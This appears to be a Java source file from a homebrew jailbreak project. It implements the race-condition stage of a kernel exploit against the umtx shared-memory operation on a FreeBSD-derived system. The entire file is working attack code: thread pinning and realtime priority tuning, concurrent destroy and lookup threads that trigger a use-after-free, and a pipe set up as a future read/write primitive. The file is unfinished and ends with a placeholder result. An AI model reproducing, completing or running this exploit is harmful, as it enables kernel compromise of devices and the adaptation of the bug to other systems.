package org.homebrew.umtx;

import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import org.homebrew.LoggingUI;
import org.homebrew.NativeMemory;
import org.homebrew.libkernel;

public class Exploit {
    // Constants
    private static final int UMTX_OP_SHM = 26; // 25 on BSD
    private static final int UMTX_SHM_CREAT = 0x0001;
    private static final int UMTX_SHM_LOOKUP = 0x0002;
    private static final int UMTX_SHM_DESTROY = 0x0004;

    private static final int CPU_SETSIZE = 16;
    private static final int CPU_LEVEL_WHICH = 3;
    private static final int CPU_WHICH_TID = 1;

    private static final short RTP_PRIO_REALTIME = 2;
    private static final int RTP_SET = 1;

    // Configuration for race
    private static final short MAIN_TREAD_CORE = 0;
    private static final short MAIN_TREAD_PRIO = 256;
    private static final short[] DESTROYER_TREAD_CORE = new short[] { 1, 2 };
    private static final short[] DESTROYER_TREAD_PRIO = new short[] { 256, 256 };
    private static final short LOOKUP_TREAD_CORE = 3;
    private static final short LOOKUP_TREAD_PRIO = 767;
    private static final int NUM_RACE_ATTEMPTS = 0x1000;

    // Configuration for post exploit
    private static final long PIPE_SLOW_SIZE = 0x10000;

    // UMTX key area
    private long shmKey;

    // pid for searching for this process later
    private int ourPid;

    // Pipe for read/write prim via stack reads/writes
    private int pipeSlowReadFd;
    private int pipeSlowWriteFd;
    private long pipeSlowScratchBuf;

    private static int pinToCoreSelf(int core) {
        long mask = NativeMemory.allocateMemory(CPU_SETSIZE);
        NativeMemory.setMemory(mask, CPU_SETSIZE, (byte) 0);
        int byteIdx = core / 8;
        int bitIdx = core % 8;
        NativeMemory.putByte(mask + byteIdx, (byte) (1 << bitIdx));
        return libkernel.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID,
                -1, CPU_SETSIZE, mask);
    }

    private static int setRtprioSelf(short value) {
        long prio = NativeMemory.allocateMemory(0x4);
        NativeMemory.setMemory(prio, 0x4, (byte) 0);
        NativeMemory.putShort(prio, RTP_PRIO_REALTIME);
        NativeMemory.putShort(prio + 2, value);
        return libkernel.rtprio_thread(RTP_SET, 0, prio);
    }

    private static int UmtxShmCreate(long key) {
        return libkernel._umtx_op(0, UMTX_OP_SHM, UMTX_SHM_CREAT, key, 0);
    }

    private static int UmtxShmDestroy(long key) {
        return libkernel._umtx_op(0, UMTX_OP_SHM, UMTX_SHM_DESTROY, key, 0);
    }

    private static int UmtxShmLookup(long key) {
        return libkernel._umtx_op(0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, key, 0);
    }

    private static int ShmResizeTag(int fd) {
        return libkernel.ftruncate(fd, fd * 0x4000);
    }

    private static int ShmClose(int fd) {
        return libkernel.close(fd);
    }

    private static void println(String s) {
        LoggingUI.getInstance().log("    " + s);
    }

    public int prepare() {
        int returnCode = 0;
        // Create a UMTX key area to use, these just have to be valid pointers
        this.shmKey = NativeMemory.allocateMemory(0x100);
        NativeMemory.setMemory(this.shmKey, 0x100, (byte) 0);

        // Pin main thread to core 1 with high prio
        returnCode = pinToCoreSelf(MAIN_TREAD_CORE);
        if (returnCode < 0) {
            println("[+] Failed to pin main thread, returnCode: " + returnCode);
            return returnCode;
        }
        returnCode = setRtprioSelf(MAIN_TREAD_PRIO);
        if (returnCode < 0) {
            println("[+] Failed to set main thread prio, returnCode: " + returnCode);
            return returnCode;
        }
        println("[+] Main thread on cpu: " + libkernel.getCurrentCpu());

        // Get pid for searching for this process later
        this.ourPid = libkernel.getpid();
        println("[+] pid: " + this.ourPid);

        // Create pipe for read/write prim via stack reads/writes
        long pipeSlowFds = NativeMemory.allocateMemory(8);
        returnCode = libkernel.pipe(pipeSlowFds);
        if (returnCode < 0) {
            println("[+] Failed to create pipe, returnCode: " + returnCode);
        }
        this.pipeSlowReadFd = NativeMemory.getInt(pipeSlowFds);
        this.pipeSlowWriteFd = NativeMemory.getInt(pipeSlowFds + 4);
        this.pipeSlowScratchBuf = NativeMemory.allocateMemory(PIPE_SLOW_SIZE);

        return 0;
    }

    class SynchronizedRepeatableJob implements Runnable {
        protected String name;
        private short core;
        private short prio;
        private AtomicBoolean runSignal;
        private AtomicBoolean resetSignal;
        private AtomicBoolean stopSignal;
        private AtomicInteger waitingReadyCounter;
        private AtomicInteger waitingResetCounter;

        public SynchronizedRepeatableJob(String name, short core, short prio, AtomicBoolean runSignal,
                AtomicBoolean resetSignal, AtomicBoolean stopSignal, AtomicInteger waitingReadyCounter,
                AtomicInteger waitingResetCounter) {
            this.name = name;
            this.core = core;
            this.prio = prio;
            this.runSignal = runSignal;
            this.resetSignal = resetSignal;
            this.stopSignal = stopSignal;
            this.waitingReadyCounter = waitingReadyCounter;
            this.waitingResetCounter = waitingResetCounter;
        }

        @Override
        public void run() {
            prepare();
            loop();
        }

        private void prepare() {
            int returnCode;
            println("[+] " + this.name + ": pinning thread to " + this.core);
            returnCode = pinToCoreSelf(this.core);
            if (returnCode < 0) {
                println("[+] " + this.name + ": failed to pin thread, returnCode: " + returnCode);
            }
            println("[+] " + this.name + ": setting prio " + this.prio);
            returnCode = setRtprioSelf(this.prio);
            if (returnCode < 0) {
                println("[+] " + this.name + ": failed to set prio, returnCode: " + returnCode);
            }
            println("[+] " + this.name + ": prepaired on cpu " + libkernel.getCurrentCpu());
        }

        private void loop() {
            while (!this.stopSignal.get()) {
                this.waitingReadyCounter.incrementAndGet();
                while (!this.runSignal.get()) {
                    Thread.yield();
                }
                work();
                this.waitingResetCounter.incrementAndGet();
                println("[+] " + this.name + ": waiting for reset");
                while (!this.resetSignal.get()) {
                    Thread.yield();
                }
                println("[+] " + this.name + ": resetting");
            }
            println("[+] " + this.name + ": finished");
        }

        protected void work() {
            Thread.yield();
        }
    }

    class DestroyerJob extends SynchronizedRepeatableJob {
        private AtomicInteger destructionsCounter;
        private long shmKey;

        public DestroyerJob(String name, short core, short prio, AtomicBoolean runSignal,
                AtomicBoolean resetSignal, AtomicBoolean stopSignal, AtomicInteger waitingReadyCounter,
                AtomicInteger waitingResetCounter, AtomicInteger destructionsCounter, long shmKey) {
            super(name, core, prio, runSignal, resetSignal, stopSignal, waitingReadyCounter, waitingResetCounter);
            this.destructionsCounter = destructionsCounter;
            this.shmKey = shmKey;
        }

        @Override
        protected void work() {
            int result = UmtxShmDestroy(shmKey);
            println("[+] " + this.name + ": destroyed, result: " + result);
            if (result == 0) {
                this.destructionsCounter.incrementAndGet();
            }
        }
    }

    class LookupJob extends SynchronizedRepeatableJob {
        private AtomicInteger lookupFd;
        private long shmKey;

        public LookupJob(String name, short core, short prio, AtomicBoolean runSignal,
                AtomicBoolean resetSignal, AtomicBoolean stopSignal, AtomicInteger waitingReadyCounter,
                AtomicInteger waitingResetCounter, AtomicInteger lookupFd, long shmKey) {
            super(name, core, prio, runSignal, resetSignal, stopSignal, waitingReadyCounter, waitingResetCounter);
            this.lookupFd = lookupFd;
            this.shmKey = shmKey;
        }

        @Override
        protected void work() {
            int result = UmtxShmLookup(shmKey);
            println("[+] " + this.name + ": looked up, result: " + result);
            lookupFd.set(result);
        }
    }

    public RaceResult race() {
        AtomicBoolean runAllSignal = new AtomicBoolean();
        AtomicBoolean resetAllSignal = new AtomicBoolean();
        AtomicBoolean stopAllSignal = new AtomicBoolean();
        AtomicInteger waitingReadyCounter = new AtomicInteger();
        AtomicInteger destructionsCounter = new AtomicInteger();
        AtomicInteger waitingResetCounter = new AtomicInteger();
        AtomicInteger lookupFd = new AtomicInteger();
    
        DestroyerJob[] destroyerJobs = new DestroyerJob[2];
        Thread[] destroyerThreads = new Thread[2];
        for (int i = 0; i < 2; i++) {
            destroyerJobs[i] = new DestroyerJob("destroyer[" + i + "]", DESTROYER_TREAD_CORE[i],
                    DESTROYER_TREAD_PRIO[i], runAllSignal, resetAllSignal, stopAllSignal, waitingReadyCounter,
                    waitingResetCounter, destructionsCounter, this.shmKey);
            destroyerThreads[i] = new Thread(destroyerJobs[i]);
        }
        for (int i = 0; i < 2; i++) {
            destroyerThreads[i].start();
        }

        LookupJob lookupJob = new LookupJob("lookup", LOOKUP_TREAD_CORE,
                LOOKUP_TREAD_PRIO, runAllSignal, resetAllSignal, stopAllSignal, waitingReadyCounter,
                waitingResetCounter, lookupFd, this.shmKey);
        Thread lookupThread = new Thread(lookupJob);
        lookupThread.start();

        for (int attempt = 0; attempt < NUM_RACE_ATTEMPTS; ++attempt) {
            println("[+] attempt " + attempt);
            // prepare
            int descriptor = UmtxShmCreate(this.shmKey);
            println("[+] created descriptor " + descriptor);
            int returnCode;
            returnCode = ShmResizeTag(descriptor);
            println("[+] ShmResizeTag returned " + returnCode);
            returnCode = ShmClose(descriptor);
            println("[+] ShmClose returned " + returnCode);
            while (waitingReadyCounter.get() != 3) {
                Thread.yield();
            }
            waitingReadyCounter.set(0);
            resetAllSignal.set(false);

            // run
            runAllSignal.set(true);
            while (waitingResetCounter.get() != 3) {
                Thread.yield();
            }
            waitingResetCounter.set(0);
            runAllSignal.set(false);

            // TODO: check
            println("[+] destructionsCounter: " + destructionsCounter.get());
            destructionsCounter.set(0);

            // finalize
            if (lookupFd.get() == -1) {
                println("[+] lookup failed");
            } else {
                println("[+] lookup succeeded, lookupFd: " + lookupFd.get());
                returnCode = ShmClose(lookupFd.get());
                println("[+] ShmClose(lookupFd.get()) returned " + returnCode);
            }
            if (attempt + 1 == NUM_RACE_ATTEMPTS) {
                stopAllSignal.set(true);
            }
            resetAllSignal.set(true);
        }
        return new RaceResult(1, 2, 3);
    }
}
